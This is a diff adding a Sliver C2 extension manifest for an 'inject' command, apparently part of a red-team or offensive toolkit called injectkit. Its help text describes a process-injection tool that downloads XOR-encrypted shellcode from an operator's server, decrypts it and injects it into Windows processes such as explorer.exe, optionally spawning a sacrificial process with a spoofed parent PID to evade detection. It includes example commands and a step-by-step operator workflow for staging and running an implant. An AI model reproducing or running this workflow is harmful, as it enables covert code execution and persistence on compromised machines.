@@ -1,0 +1,26 @@
+{
+    "name": "inject",
+    "version": "0.1.0",
+    "extension_author": "injectkit",
+    "original_author": "injectkit",
+    "repo_url": "",
+    "help": "Inject shellcode into a remote process with optional PPID spoofing. Fetches an XOR-encrypted shellcode payload from the operator's HTTPS server, decrypts it, and injects it into a target process via NT-native APIs (no RWX, no kernel32 VirtualAlloc).\n\nUsage — inject into existing process:\n  inject url=<https://...> key=<64 hex chars> target=<process.exe>\n\nUsage — spawn a sacrificial process with spoofed parent, inject into it:\n  inject url=<https://...> key=<64 hex chars> spawn=<process.exe> ppid=<parent.exe>\n\nExamples:\n  inject url=https://192.168.1.10:8443/abc key=<key> target=explorer.exe\n  inject url=https://192.168.1.10:8443/abc key=<key> spawn=RuntimeBroker.exe ppid=explorer.exe\n\nOperator workflow:\n  1. injectkit stage --shellcode implant.bin --url https://192.168.1.10:8443/abc --serve\n  2. sliver> extensions install build/inject-0.1.0.tar.gz\n  3. sliver (TARGET)> inject url=https://192.168.1.10:8443/abc key=<key> target=explorer.exe",
+    "commands": [
+        {
+            "name": "inject",
+            "entrypoint": "GoExtensionArgs",
+            "help": "Inject shellcode into a remote process (existing or spawned with PPID spoof) via NT-native APIs",
+            "allow_args": true,
+            "default_args": "",
+            "is_reflective": false,
+            "is_assembly": false,
+            "files": [
+                {
+                    "os": "windows",
+                    "arch": "amd64",
+                    "path": "inject.x64.dll"
+                }
+            ]
+        }
+    ]
+}
